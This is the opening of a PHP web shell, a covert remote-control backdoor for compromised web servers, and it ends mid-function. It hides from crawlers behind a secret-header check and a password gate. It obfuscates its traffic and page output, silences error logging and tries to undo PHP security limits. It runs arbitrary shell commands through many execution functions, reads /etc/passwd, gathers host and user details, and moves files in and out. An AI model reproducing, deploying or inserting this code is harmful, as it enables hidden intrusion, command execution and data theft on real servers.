<?php
$GLOBALS['HASHTYPE'] = 'sha512';
$GLOBALS['PASSHASH'] = '584c19ee1bfab5e25c08617396286dd673a5de142ebe1510f3e51842823df5bc3c283a5a7954d3e90bf99f6f556fa718faa23b8855ff1f72d8a7b7c84a3a8d76';//P@55w()rD
$GLOBALS['SECHEAD'] = 'USER_AGENT';
$GLOBALS['COOKIE'] = true;
$GLOBALS['DARK'] = false;
$GLOBALS['REMOTE_ADDR'] = true;
$GLOBALS['DEBUG'] = (isset($GLOBALS['DEBUG']) ? $GLOBALS['DEBUG'] : false);

filterClient();
decodeRequest();
checkAuth();

function checkAuth(){
	if(!$GLOBALS['PASSHASH']) return setEncKey();

	$loginWithPass = (isset($_REQUEST['pass']) && hash($GLOBALS['HASHTYPE'], $_REQUEST['pass']) === $GLOBALS['PASSHASH']);
	$encKeyWithPass = ($GLOBALS['ENCKEY'] === genEncKey($GLOBALS['PASSHASH']));

	if($loginWithPass)
		setEncKey($GLOBALS['PASSHASH']);
	elseif($encKeyWithPass)
		setEncKey();
	else
		loginFormOut();
}

function getEncKey(){
	$len = $GLOBALS['PRELEN'];
	
	foreach($_REQUEST as $k => &$v){
		$pref = strrev(substr($k, 0, $len));
		$post = substr($k, $len, $len);
		if($pref === $post){
			$eKey = $v;
			unset($_REQUEST[$k]);
			$GLOBALS['ENCKEY'] = base64_decode($eKey);
			return $GLOBALS['ENCKEY'];
		}
	}
	
	return false;
}

function genEncKey($str){
	return base64_encode(hash($GLOBALS['HASHTYPE'], ($GLOBALS['REMOTE_ADDR'] ? $_SERVER['REMOTE_ADDR'] : '').$str.__FILE__));
}

function setEncKey($pass = ''){
	if(!$pass && $GLOBALS['ENCKEY']) return $GLOBALS['ENCKEY'];
	$eKey = genEncKey($pass);
	$GLOBALS['ENCKEY'] = $eKey;
	return $eKey;
}

function decodeRequest(){
	$_REQUEST = array_merge($_FILES, $_COOKIE, $_REQUEST); unset($_GET, $_POST, $_COOKIE);
	$GLOBALS['PRELEN'] = getPreLen();
	if(!$GLOBALS['ENCKEY'] = getEncKey()) $GLOBALS['ENCKEY'] = setEncKey();
	$_REQUEST = decodeInput($_REQUEST);
}

function getPreLen(){
	return (substr(array_sum(str_split(hash($GLOBALS['HASHTYPE'], __FILE__))), -1) + 5);
}

function filterClient(){
	$secretHeader = isset($_SERVER['HTTP_'.$GLOBALS['SECHEAD']]);
	$crawlerBot = preg_match('/bot|crawl|spider/i', $_SERVER['HTTP_USER_AGENT']);
	if($crawlerBot || !$secretHeader) exit(header('HTTP/1.1 404 Not Found'));
}

function loginFormOut(){
	$html = '<html><head><meta name="robots" content="noindex"></head><body style="display:grid;height:100vh;margin:0;place-items:center center;"><form action="" method="POST" onsubmit="return login(this)"><input style="text-align: center" name="pass" type="password" value=""></form></body>'.paramsHandlerJS().'</html>';
	exit(makeOut($html));
}

function scriptInit(){
	if(!isset($GLOBALS['DEBUG'])) return;
	define('D', $GLOBALS['DEBUG']);
	set_time_limit(D ? 15 : 0);
	error_reporting(D ? E_ALL : 0);
	ini_set('display_errors', D ? 'On' : 'Off');
	ini_set('max_execution_time', D ? 15 : 0);
	ini_set('error_log', NULL);
	ini_set('log_errors', 0);
}

function decodeInput(&$arr){
	$str = '';
	foreach($arr as $k => $v){
		$key = getName($k);
		if(!strlen($key)) continue;
		$str .= $key.'='.urlencode(getValue($v)).'&';
		unset($arr[$k]);
	}
	parse_str($str, $dec);
	return array_merge($arr, $dec);
}

function xorStr($str, $decode = false) {
	$key = $GLOBALS['ENCKEY'];
    $key_len = strlen($key);
    $str = (!$decode ? rawurlencode($str) : $str);
    for($i = 0; $i < strlen($str); $i++)
        $str[$i] = $str[$i] ^ $key[$i % $key_len];
    $str = ($decode ? rawurldecode($str) : $str);
    return $str;
}

function ascii2hex($ascii) {
	$hex = '';
	for ($i = 0; $i < strlen($ascii); $i++) {
		$byte = strtoupper(dechex(ord($ascii[$i])));
		$byte = str_repeat('0', 2 - strlen($byte)).$byte;
		$hex.=$byte;
	}
	return $hex;
}

function hex2ascii($hex){
	$ascii='';
	$hex=str_replace(" ", "", $hex);
	for($i=0; $i<strlen($hex); $i=$i+2)
		$ascii.=chr(hexdec(substr($hex, $i, 2)));
	return($ascii);
}

function setName($str){
	$str = ascii2hex(xorStr($str));
	$pref = substr($GLOBALS['ENCKEY'], 0, $GLOBALS['PRELEN']);
	return $pref.$str;
}

function getName($str){
	$data = getData($str);
	if($data === false) return false;
	return xorStr(hex2ascii($data), true);
}

function setValue($str){
	return base64_encode(xorStr($str));
}

function getValue($str){
	return xorStr(base64_decode($str), true);
}

function getData($str){
	$ln = $GLOBALS['PRELEN'];
	$pref = substr($str, 0, $ln);
	$data = substr($str, $ln);
	return ($pref === substr($GLOBALS['ENCKEY'], 0, $ln) ? $data : false);
}

function genJunk($min = 10, $max = 100){
	$rand = '';
	$repeat = rand($min, $max);
	while(!isset($rand[$repeat])) $rand .= chr(rand(1, 127));
	if(rand(1,2) == 1)
		return '//'.str_replace(array("\r","\n"), "", $rand)."\n";
	else
		return '/*'.str_replace('*/','', $rand).'*/';
}

function paramsHandlerJS(){
	return '<script>
		var ENCKEY = atob("'.base64_encode($GLOBALS['ENCKEY']).'");
		var PRELEN = '.$GLOBALS['PRELEN'].';
		var COOKIE = '.(int)$GLOBALS['COOKIE'].';

		'.($GLOBALS['DARK'] ? 'invertColors();' : '').'
		startEventsListners();
		if(COOKIE) deleteAllCookies();

		function startEventsListners(){
			var elements = document.getElementsByTagName("*");
		
			for(var i=0;i<elements.length;i++){

				if(elements[i].type && elements[i].type == "file")
						elements[i].onchange = function(e){
							if(!elmById("cbRR").checked) prepareFile(this)
							else uplFiles();
						}
					
			}
		}
				
		function bin2hex(bin){
		  var hex = "";
		  for(var i = 0; i<bin.length; i++){
		    var c = bin.charCodeAt(i);
		    if (c>0xFF) c -= 0x350;
		    hex += (c.toString(16).length === 1 ? "0" : "") + c.toString(16);
		  }
		  return hex;
		}
		
		function login(form){
			addEncKey(form);
			form.pass.value = setValue(form.pass.value);
			form.pass.name = setName(form.pass.name);
			
			if(COOKIE)
				submitViaCookie(form);
			else
				return true;
				
			return false;
		}
		  
		function hex2bin(hex) {
		  var bin = "";
		  for (var i=0; i<hex.length; i=i+2) {
		    var c = parseInt(""+hex[i]+hex[i+1], 16);
		    if (c>0x7F) c += 0x350;
		    bin += String.fromCharCode(c);
		  }
		  return bin;
		}
			
		function xorStr(str, decode = false) {
			str = (!decode ? encodeURIComponent(str) : str);
			str = str.split("");
		    key = ENCKEY.split("");
		    var str_len = str.length;
		    var key_len = key.length;
		
		    var String_fromCharCode = String.fromCharCode;
		
		    for(var i = 0; i < str_len; i++) {
		        str[i] = String_fromCharCode(str[i].charCodeAt(0) ^ key[i % key_len].charCodeAt(0));
		    }
		    str = str.join("");
		    
		    if(decode){ 
				try{
					str = decodeURIComponent(str);
				}
				catch(e){
					str = unescape(str);
				}
			}

		    return str;
		}
		
		function setName(str){
			str = bin2hex(xorStr(str));
			pref = ENCKEY.substr(0, PRELEN);
			return pref + str;
		}
		
		function setValue(str){
			return btoa(xorStr(str));
		}
		
		function getValue(str){
			return xorStr(atob(str), true);
		}
		
		function addEncKey(form){
			var encKey = document.createElement("input");
			encKey.type = "hidden";
			pref = ENCKEY.substr(0, PRELEN);
			encKey.name = pref.split("").reverse().join("") + pref;
			encKey.value = btoa(ENCKEY);
			form.appendChild(encKey);
			return form;
		}
		
		function fixFileName(str, len = false){
			str = str.split(/(\\\\|\\/)/g).pop();
			if(len) str = str.substring(0, len);
			return str;
		}
		
		function getParentFormOf(element){
			
			while(element.tagName != "FORM")
				element = element.parentElement;

			return element;
		}
		
		function prepareFile(input){
			var file = input;
			form = getParentFormOf(input);
			form.enctype = "application/x-www-form-urlencoded";
			
			if(file.files.length){
				var reader = new FileReader();
				
				reader.onload = function(e){
						filename = fixFileName(input.value);
						wwwFile = document.createElement("input");
						wwwFile.type = "hidden";
						wwwFile.id = input.name;
						wwwFile.name = input.name + "["+filename+"]";
						wwwFile.value = e.target.result;
						if(e.target.result.length <= 2097152)
							form.appendChild(wwwFile);
						else
							if(confirm("Request size is ~" + Math.round(((e.target.result.length * 2) / 1024) / 1024) + "M, but limits is often around <= 8M. There is no guarantee that the file will be uploaded.\nYou can disable request encoding, use other upload methods or select a smaller file. Continue?"))
								form.appendChild(wwwFile);
							else
								return false;
							
						uplFiles();
						
						elements = form.getElementsByTagName("*");
						for(var i = 0; i < elements.length; i++)
							if(elements[i].type === "hidden")
								form.removeChild(elements[i]);
				};
				
				reader.readAsDataURL(file.files[0]);
				return reader;
			}
			
		}

		function deleteAllCookies() {	
			var cookies = document.cookie.split(";");
		
			for (var i = 0; i < cookies.length; i++) {
				var cookie = cookies[i];
				var eqPos = cookie.indexOf("=");
				var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
				document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
			}
			
			return false;
		}
	
		function submitViaCookie(encodedForm, refresh = true){
			var reqlen = 0;
			var elements = encodedForm.getElementsByTagName("*");
			
			for(i = 0; i < elements.length; i++) {
				
				if(!elements[i].name) continue;
				
				name = elements[i].name;
				value = encodeURIComponent(elements[i].value);

				if(value.length > 4095 || reqlen > 7696){
					if(confirm("The request header is too big, send it via POST?")){
						deleteAllCookies();
						return false;
					}
					else{
						deleteAllCookies();
						return "CANCEL";
					}
				}
				
				document.cookie =  name + "=" + value;
				reqlen = reqlen + name.length + value.length;
			}
			
			if(refresh)
				window.location = window.location.pathname;
			else
				return "SEND";
		}
		
		function invertColors() {
		    var css = "html{background: #0d0d0d; -webkit-filter: invert(100%); -moz-filter: invert(100%); -o-filter: invert(100%); -ms-filter: invert(100%);}";
		    var head = document.getElementsByTagName("head")[0];
		    var style = document.createElement("style");
		    if(!window.counter)
		        window.counter = 1;
		    else{
		        window.counter++;
		        if (window.counter % 2 == 0)
		            var css = "html{background: #f0f0f0; -webkit-filter: invert(0%); -moz-filter: invert(0%); -o-filter: invert(0%); -ms-filter: invert(0%);}"
		    }
		    style.type = "text/css";
		    
		    if(style.styleSheet)
		        style.styleSheet.cssText = css;
		    else
		        style.appendChild(document.createTextNode(css));
		        
		    head.appendChild(style);
		    
		    return false;
		}
</script>';
}

function j(){
	return genJunk(100, 300);
}

function makeOut($str){
	print('<script>'.j().'document'.j().'.'.j().'write'.j().'('.j().'decodeURIComponent'.j().'('.j().'atob'.j().'('.j().'('.j().implode('+', array_map(function($k){return j().'"'.$k.'"'.j();}, str_split(strrev(base64_encode(rawurlencode($str))), rand(200, 500)))).j().')'.j().'.'.j().'split'.j().'('.j().'""'.j().')'.j().'.'.j().'reverse'.j().'('.j().')'.j().'.'.j().'join'.j().'('.j().'""'.j().')'.j().')'.j().')'.j().')'.j().';'.j().'</script>');
}

function sDie($str = ''){
	if(RO)
		die($str);
	else{
		$out = ob_get_contents();
		ob_end_clean();
	}
	
	if(preg_grep('|attachment|', headers_list())) print gzencode($out.$str, 9);
	else
		print setValue($out.$str);
	die;
}

#
#
#

@ini_set('log_errors_max_len',-1);
@ini_restore('error_log');
@ini_set('error_log','');
@ini_restore('log_errors');
@ini_set('log_errors',0);
@ini_set('display_errors',0);
@ini_restore('error_reporting');
@ini_set('error_reporting',~E_ALL);
@error_reporting(0);

if(PHP_VERSION<'5.4'){
	ini_restore('safe_mode');
	ini_set('safe_mode',0);
	ini_restore('safe_mode_exec_dir');
	ini_set('safe_mode_exec_dir','');
	ini_restore('magic_quotes_sybase');
	ini_set('magic_quotes_sybase',0);
	ini_restore('magic_quotes_runtime');
	ini_set('magic_quotes_runtime',0);
	ini_set('magic_quotes_gpc',0);
	set_magic_quotes_runtime(0);
}

ini_restore('open_basedir');
ini_set('open_basedir','');
ini_restore('disable_function');
ini_set('disable_function','');
ini_restore('disable_classes');
ini_set('disable_classes','');
ini_set('max_execution_time',0);
set_time_limit(0);
ini_set('memory_limit','1024M');
ini_restore('file_uploads');
ini_set('file_uploads',1);
ini_restore('enable_post_data_reading');
ini_set('enable_post_data_reading',1);

if(defined('SID'))
	session_write_close();
	
scriptInit();

function unQuote($a){
	foreach($a as $k => $v)
		if(is_array($v))
			$a[$k] = unQuote($v);
		else
			$a[$k] = stripslashes($v);
			return $a;
}
	
function prepVals(&$a,$k){
	foreach($a as $i => $v)
		if(is_array($v)) prepVals($a[$i],$k);
		elseif(strlen($v)>2){
			$r = '';
			$v = explode($k, $v);
			for($n = count($v)-1; $n>=0; --$n){
				$c = array_pop($v);
				if($c === '')
					$c = $k;
				if($n%2 === 0)
					$r .= $c;
				else
					$r = $c.$r;
			}
			$a[$i]=$r;
		}
}

if(defined('CED'))
	$D = unserialize(pack('H*', CED));
else{
	if(isset($_REQUEST['a']))
		$D=$_REQUEST;
	elseif(isset($_REQUEST['a']))
		$D=$_REQUEST;
	else
		$D=array();
		
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
		$D = unQuote($D);
	
	if(isset($D['k'])){
		$k = $D['k'];
		unset($D['k']);
		prepVals($D,$k);
	}
}

$C = array(''=>'UTF-8','UTF-16','Windows-1250','Windows-1251','Windows-1252','Windows-1254','Windows-1256','Windows-1257','ISO-8859-1','ISO-8859-2','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-13','Big5','GBK','Shift_JIS','EUC-KR','EUC-JP','IBM866','KOI8-R','KOI8-U',);

define('VER', '1.0');
define('DSC', DIRECTORY_SEPARATOR);
define('NIX', DSC === '/');
define('RO', isset($D['ro']) ? true : false);
define('TM', isset($D['tm']) ? true : false);
define('CSE', isset($D['c']) ? $C[$D['c']]:'UTF-8');

ob_end_clean();
if(!RO) ob_start();

if(!defined('CED')){
	if(isset($D['a'])){
		$md5 = md5(rand(0, 777777));
		if(isset($D['d'])){
			if($D['a']==='f'){
				if(is_array($D['d'])){
						$D['DBP'] = samePath($D['d']);
						$n = $md5.'.zip';
					}
					elseif(is_dir($D['d']))
						$n = $md5.'.zip';
					else
						$n = fileName($D['d']);
						$n = escFileName($n);
			}
			else
				$n = $md5.'.zip';
				
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.$n.(RO ? '' : '.gz').'"');
		}
		else{
			header('Content-Type: application/json; charset='.CSE);
			header('X-Content-Type-Options: nosniff');
		}
	}
	else
		header('Content-Type: text/html; charset='.CSE);		
}
					
function escHTML($v){
	return str_replace(array('&','"','<','>'), array('&amp;','&quot;','&lt;','&gt;'), $v);
}

function selfPath(){
	if(isset($_SERVER['SCRIPT_FILENAME'])) return filePath($_SERVER['SCRIPT_FILENAME']);
	if(isset($_SERVER['DOCUMENT_ROOT'])) return substr($_SERVER['DOCUMENT_ROOT'],-1) === DSC ? $_SERVER['DOCUMENT_ROOT'] : $_SERVER['DOCUMENT_ROOT'].DSC;
	if(PHP_VERSION >= '5.3') return substr(__DIR__,-1) === DSC ? __DIR__ : __DIR__.DSC;
	return filePath(__FILE__);
}

function filePath($p){
	$p = rtrim($p, DSC);
	return implode(DSC, array_slice(explode(DSC,$p), 0, -1)).DSC;
}

function fileName($p){
	$p=rtrim($p, DSC);
	$i=strrpos($p, DSC);
	return $i=== FALSE ? $p : substr($p,$i+1);
}

function writeFile($p,$c){
	if($v = fopen($p,'wb')){
		flock($v,LOCK_EX);
		fwrite($v,$c);
		fflush($v);
		flock($v,LOCK_UN);
		fclose($v);
		return TRUE;
	}

	if(PHP_VERSION>='5'){
		$v = file_put_contents($p,$c);
		if(is_int($v)) return TRUE;
	}

	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
		try{
			$v = new SplFileObject($p,'wb');
		}
		catch(Exception $e ){
			$v=FALSE;
		}
	
		if($v){
			$v->flock(LOCK_EX);
			$v->fwrite($c);
			$v->fflush();
			$v->flock(LOCK_UN);
			unset($v);
			return TRUE;
		}
	}
	endif;
	
	return FALSE;
}

function tempName(){
	$a = 'poiuytrewqlkjhgfdsamnbvcxzMNBVCXZLKJHGFDSAPOIUYTREWQ0987654321';
	$v = '.';
	for($i = 0; $i < 8; ++$i) $v .= $a[rand(0,61)];
	return $v.'.tmp';
}

function tempFile($v){
	if(($n = tempnam(NIX ? '/tmp' : 'c:\\Temp', '')) && (writeFile($n, $v))) return $n;
	$a = array('upload_tmp_dir','session.save_path','user_dir','doc_root');
	
	foreach($a as $k)
		if($n = ini_get($k)){
			$n .= DSC.tempName();
			if(writeFile($n, $v)) return $n;
		}
		
		$n = selfPath().tempName();
		
		if(writeFile($n, $v)) return $n;
	
	return FALSE;
}

function getFile($p){
	$v = NULL;
	
	if($v = fopen($p,'rb')){
		$r = '';
		while(!feof($v)) $r .= fread($v, 1048576);
		fclose($v);
		return $r;
	}
	
	if(PHP_VERSION >= '4.3'){
		$v = file_get_contents($p);
		if(is_string($v)) return $v;
	}
	
	$v = file($p);
	if(is_array($v)) return implode('',$v);
	
	if(PHP_VERSION>='5') : if(PHP_VERSION>='5.1'){
		try{
			$v = new SplFileObject($p,'rb');
		}
		catch(Exception $e){
			$v = FALSE;
		}
	
		if($v){
			$r = '';
			while(!$v->eof()) $r .= $v->fgets();
			unset($v);
			return$r;
		}
	}
	endif;
	
	if(RO && defined('FORCE_GZIP')){
		if($v = gzopen($p)){
			$r='';
			while(!gzeof($v)) $r .= gzread($v, 1048576);
			gzclose($v);
			return $r;
		}
		$v = gzfile($p);
		if(is_array($v)) return implode('',$v);
	}
	
	if(RO && $v=ob_start()){
		if(is_int(readfile($p)) || copy($p, 'php://output') || (defined('FORCE_GZIP') && is_int(readgzfile($p)))){
			$r = ob_get_contents();
			ob_end_clean();
			return $r;
		}
		ob_end_clean();
	}
	
	return FALSE;
}

function delFile($p){
	return (unlink($p) || (NIX && rename($p,'/dev/null') && !is_file($p) && !file_exists($p)));
}

function nesc($v){
	return "'".str_replace("'", '\'"\'"\'', $v)."'";
}

function wesc($v){
	return str_replace(array('^', '&', '\\', '<', '>', '|'), array('^^', '^&', '^\\', '^<', '^>', '^|'), $v);
}

function exe($cmd, $fnc, $sh = '', $se = TRUE, $or = '') {
	$se = '2>' . ($se ? '&1' : (NIX ? '/dev/null' : 'nul')) . $or;
	if (NIX)
		$sc = 'echo ' . nesc($cmd) . '|' . ($sh === '' ? '$0' : $sh) . ' ' . $se . ' & exit';
	else
		$sc = ($sh === '' ? '(' . $cmd . ')' : $sh . ' /C ' . wesc($cmd) . ' ') . $se;
	switch ($fnc) {
		case 0:
			system($sc);
			break;
		case 1:
			passthru($sc);
			break;
		case 2:
			echo `$sc`;
			break;
		case 3:
			echo shell_exec($sc);
			break;
		case 4:
			$r = NULL;
			exec($sc, $r);
			if (is_array($r))
				foreach ($r as $v)
					echo $v, "\n";
			break;
		case 5:
			if ($h = popen($sc, 'r')) {
				while (!feof($h))
					echo fread($h, 1024);
				pclose($h);
			}
			break;
		case 6:
			if($h = proc_open($sc,array(array('pipe','r'), array('pipe','w'), array('pipe','a')),$p)){
				echo stream_get_contents($p[1]);
				fclose($p[0]);
				fclose($p[1]);
				proc_close($h);
			}
		case 7:
			if ($h = fopen('expect://' . $sc, 'r')) {
				while (!feof($h))
					echo fread($h, 1024);
				fclose($h);
			}
			break;
		case 8:
			if ($h = expect_popen($sc)) {
				while (!feof($h))
					echo fread($h, 1024);
				fclose($h);
			}
			break;
		case 10:
			if ($h = new COM('WScript.Shell'))
				echo $h->Exec(($sh === '' ? 'cmd' : $sh) . ' /C ' . $cmd . ' ' . $se)->StdOut->ReadAll();
			break;
	}
}


function uName($id){
	if($id === -1) return'?';
	
	static $a = NULL, $f = FALSE;
	
	if($a === NULL){
		if($v = getFile('/etc/passwd')){
			$a = array();
			$v = explode("\n", $v);
			foreach($v as $i)
				if($i){
					$i = explode(':',$i,4);
					$a[$i[2]]=$i[0];
				}
		}
		elseif(defined('POSIX_F_OK') || function_exists('posix_getpwuid'))
			$f = (bool)posix_getpwuid(0);
	}
	
	if($a)
		if(isset($a[$id])) return $a[$id];
	elseif($f)
		if($v = posix_getpwuid($id)) return $v['name'];
	
	return $id;
}

function gName($id){
	if($id === -1) return'?';
	
	static $a = NULL, $f = FALSE;
	
	if($a === NULL){
		if($v = getFile('/etc/group')){
			$a = array();
			$v = explode("\n",$v);
			foreach($v as$i)
				if($i){
					$i = explode(':', $i, 4);
					$a[$i[2]] = $i[0];
				}
		}
		elseif(defined('POSIX_F_OK') || function_exists('posix_getgrgid')) $f = (bool)posix_getgrgid(0);
	}

	if($a)
		if(isset($a[$id])) return $a[$id];
	elseif($f)
		if($v = posix_getgrgid($id)) return $v['name'];
	
	return$id;

}

function getINI($s, &$v){
	$v = trim(ini_get($s));
	return $v!=='';
}

function isINI($v){
	$v = strtolower(trim(ini_get($v)));
	return ($v === '1' || $v === 'on');
}

function samePath($a){
	$p = NULL;
	foreach($a as $v){
		$v = array_slice(explode(DSC, rtrim($v,DSC)), 0, -1);
		if($p === NULL) $p = $v;
		else{
			$k=array();
			$c=count($p);
			$i=count($v);
			if($i < $c) $c=$i;
			for($i=0; $i < $c; ++$i)
			if($p[$i] === $v[$i]) $k[] = $p[$i];
			else
				break;
			$p = $k;
			if($i===0) break;
			}
	}
	
	return count($p) === 0 ? '': implode(DSC, $p).DSC;
}

function escFileName($v){
	return str_replace(array('%','/','\\',':','*','?','"','<','>','|'), array('%25',"\xe2\x95\xb1","\xe2\x95\xb2","\xea\x9e\x89","\xe2\x88\x97", '%3F', "\xe2\x80\x9f", '%3C', '%3E',"\xe2\x88\xa3"), $v);
}

function infMain($h = FALSE){
	echo $h ? '<table id="tblInf"><tr title="HTTP Host, Server Addr, Server Name, Host Name, Host IP"><th>' : '[{"','Address', $h ? '</th><td>' : '":';
	$a = array();
	
	foreach(array('HTTP_HOST','SERVER_ADDR','SERVER_NAME') as $v)
		if(isset($_SERVER[$v])){
			$v = trim($_SERVER[$v]);
			if($v!==''&&!in_array($v,$a))$a[]=$v;
		}
		
		if($v = php_uname('n')){
			$v = trim($v);
			if($v !== '' && !in_array($v,$a)) $a[] = $v;
		}
		
		if(PHP_VERSION>='5.3' && ($v = gethostname())){
			$v = trim($v);
			if($v !== '' && !in_array($v,$a)) $a[] = $v;
		}
		
		$r='';
		foreach($a as $k => $v){
			if($k > 0) $r.=' / ';
			$r .= $v;
			if($i=gethostbynamel($v)){
				$b = FALSE;
				foreach($i as $v)
					if(!in_array($v, $a)){
						$a[] = $v;
						if($b) $r .= ', ';
						else{$b = TRUE; $r .= ' (';} $r .= $v;
					}
					
					if($b) $r .= ')';
			}
			elseif(($i = gethostbyname($v)) && !in_array($v, $a)){
				$a[] = $v;
				$r .= ' ('.$v.')';
			}
		}
		
		if($h) echo escHTML($r);
		else jsonEcho($r);
		
		echo $h ? '</td></tr><tr><th>' : ',"','System', $h ? '</th><td>' : '":';
		
		$r = '';
		if(($v = trim(php_uname('s').' '.php_uname('r').' '.php_uname('v').' '.php_uname('m'))) !== '') $r = $v;
		elseif(NIX && ($v = getFile('/proc/version'))) $r = $v;
		else{
			if(defined('PHP_OS')) $r = PHP_OS;
			else $r = NIX ? '*NIX' : 'Windows';
			
			if(!NIX){
				$a = array();
				foreach(array('PHP_WINDOWS_VERSION_MAJOR','PHP_WINDOWS_VERSION_MINOR','PHP_WINDOWS_VERSION_BUILD') as $v) if(defined($v)) $a[] = constant($v);
				
				if($a) $r .=' '.implode('.', $a);
				if(defined('PHP_WINDOWS_VERSION_SP_MAJOR') && PHP_WINDOWS_VERSION_SP_MAJOR > 0){
					$r .= ' SP'.PHP_WINDOWS_VERSION_SP_MAJOR;
					if(defined('PHP_WINDOWS_VERSION_SP_MINOR') && PHP_WINDOWS_VERSION_SP_MINOR > 0) $r .= '.'.PHP_WINDOWS_VERSION_SP_MINOR;
				}
			}
		}
		
		if(NIX && (($v = trim(getFile('/etc/issue.net'))) !== '' || ($v = trim(getFile('/etc/issue'))) !== '')) $r .= ' ('.$v.')';
		
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
		
		if(!empty($_SERVER['SERVER_SOFTWARE'])){
			echo $h ?'</td></tr><tr><th>' : ',"','Server', $h ? '</th><td>':'":';
			if($h)
				echo escHTML($_SERVER['SERVER_SOFTWARE']);
			else
				jsonEcho($_SERVER['SERVER_SOFTWARE']);
		}
		
		echo $h ? '</td></tr><tr><th>' : ',"','Software', $h ? '</th><td>' : '":';
		
		$r = 'PHP/'.PHP_VERSION;
		
		if(defined('SUHOSIN_PATCH_VERSION')) $r .= ' with Suhosin patch/'.SUHOSIN_PATCH_VERSION;
		
		$r .= '; ';
		if(defined('CURLE_OK')){
			$r .= 'cURL';
			$v = curl_version();
			if(isset($v['version'])) $r.='/'.$v['version'];
			$r.='; ';
		}
		
		if($v = phpversion('Suhosin')) $r.=' Suhosin/'.$v;
		
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
			
		echo $h ? '</td></tr><tr><th>' : ',"','User', $h ? '</th><td>' : '":';
		
		$r='';
		$a = array();
		if(NIX){
			if(defined('POSIX_F_OK') || function_exists('posix_geteuid')){
				if(is_int($v = posix_geteuid())) $r .= 'euid='.$v.'('.uName($v).'); ';
				if(is_int($v = posix_getegid())) $r .= 'egid='.$v.'('.gName($v).'); ';
			}
			
			if(is_int($v = getmyuid())) $r .= 'ouid='.$v.'('.uName($v).'); ';
			if(is_int($v = getmygid())) $r .= 'ogid='.$v.'('.gName($v).'); ';
		}
		
		$b = FALSE;
		
		foreach(array('REMOTE_ADDR','HTTP_X_REAL_IP','HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR') as $i){
			if(!empty($_SERVER[$i])){
				if($b)
					$r.= ', ';
				else{
					$b = TRUE;
					$r .= 'IP: ';
				}
				
				$r .= $_SERVER[$i];
			}
		}
		
		if($b)
			$r .= ';';
		if($h)
			echo escHTML($r);
		else
			jsonEcho($r);
		
		echo $h ? '</td></tr><tr><th colspan="2"></th></tr><tr><th>':'},{"','Safe mode', $h ? '</th><td>' : '":';
		
		if(isINI('safe_mode')){
			$v = isINI('safe_mode_gid') ? 'GID':'UID';
			echo $h ? $v : '"'.$v.'"';
			foreach(array('Include dir' => 'safe_mode_include_dir','Exec dir' => 'safe_mode_exec_dir', 'Vars prefixes' => 'safe_mode_allowed_env_vars', 'Protected vars' => 'safe_mode_protected_env_vars') as $k => $v){
				if(!getINI($v, $v)) $v = '-';
				
				echo $h ? '</td></tr><tr><th>' : ',"', $k, $h?'</th><td>' : '":';
				if($h)
					echo escHTML($v);
				else
					jsonEcho($v);
			}
		}
		else
			echo $h ? '-' : '"-"';
		
		echo $h ? '</td></tr>' : '';
		foreach(array('Open basedir' => 'open_basedir', 'Disabled functions' => 'disable_functions', 'Disabled classes' => 'disable_classes') as $k => $v){
			if(!getINI($v, $v)) $v = '-';
			echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
			if($h)
				echo escHTML($v),'</td></tr>';
			else
				jsonEcho($v);}
			
			if(getINI('suhosin.simulation', $v)){
				echo $h ? '<tr><th colspan="2"></th></tr><tr><th>' : '},{"', 'Suhosin mode', $h ? '</th><td>' : '":"', $v ? 'simulation' : 'break', $h ? '</td></tr><tr><th>' : '","','Allow rewrite', $h ? '</th><td>' : '":';
				
			if(!getINI('suhosin.perdir', $v) || !$v) $v = '-';
			
			if($h)
				echo escHTML($v),'</td></tr>';
			else jsonEcho($v);
			
			foreach(array('Functions whitelist' => 'suhosin.executor.func.whitelist', 'Functions blacklist' => 'suhosin.executor.func.blacklist', 'Eval whitelist' => 'suhosin.executor.eval.whitelist', 'Eval blacklist' => 'suhosin.executor.eval.blacklist') as $k => $v){
				if(!getINI($v, $v)) $v = '-';
				echo $h ? '<tr><th>' : ',"', $k, $h ? '</th><td>' : '":';
				if($h)
					echo escHTML($v),'</td></tr>';
				else jsonEcho($v);
			}
			
			$a = array('eval' => 'suhosin.executor.disable_eval', '/e modifier' => 'suhosin.executor.disable_emodifier');
			
			$i = array();
			foreach($a as$k => $v)
				if(isINI($v)) $i[] = $k;
				echo $h ? '<tr><th>' : ',"', 'Disabled', $h ?'</th><td>' : '":"', $i ? implode(', ', $i) : '-', $h ? '</td></tr>' : '"';
				if(isINI('suhosin.log.file') && getINI('suhosin.log.file.name', $v)){
					echo $h ? '<tr><th>' : ',"','Log file', $h ? '</th><td>' : '":';
					if($h)
						echo escHTML($v),'</td></tr>';
					else
						jsonEcho($v);
				}
		}
		
	echo $h ? '</table>' : '}]';
}


function parsePath($p, &$b, &$n){
	$v = rtrim($p, DSC);
	$i = strrpos($v,DSC);
	if($i === FALSE){
		if(!NIX && strlen($v) === 2 && $v[1] === ':'){
			$b = $v.DSC;
			$n = '';
		}
		else{
			$b = DSC;
			$n = $v;
		}
	}
	else{
		$b = substr($v,0,$i+1);
		$n = substr($v,$i+1);
	}
}


class FileInfo{
	
	function __construct($v){
		if(is_string($v)){
			$this->fb = '';
			$this->fn= '' ;
			
			parsePath($v, $this->fb, $this->fn);
			$this->fp = $this->fb.$this->fn;
		}
		else{
			$this->fi = $v;
			$this->fp = $v->getPathName();
			$this->fb = $v->getPath();
			$this->fn = $v->getFileName();
		}
		
		$this->rp = $this->fp;
		if($this->isLink()){
			$this->rp = $this->getLinkTarget();
			if(isset($this->t)) unset($this->t);
			if(isset($this->fi)) unset($this->fi);
		}
	}
	
	function getPath(){
		return$this->fb;
	}
	
	function getFileName(){
		return$this->fn;
	}
	
	function getPathName(){
		return$this->fp;
	}
	
	function isDir(){
		if(isset($this->d)) return$this->d;
		if(!isset($this->p)) $this->getPerms();
		if($this->p !== 0){
			$this->d = ($this->p & 0170000) === 0040000;
			return $this->d;
		}
		if(!isset($this->t)) $this->type();
		if($this->t !== FALSE){
			$this->d = $this->t === 'dir';
			return $this->d;
		}
		
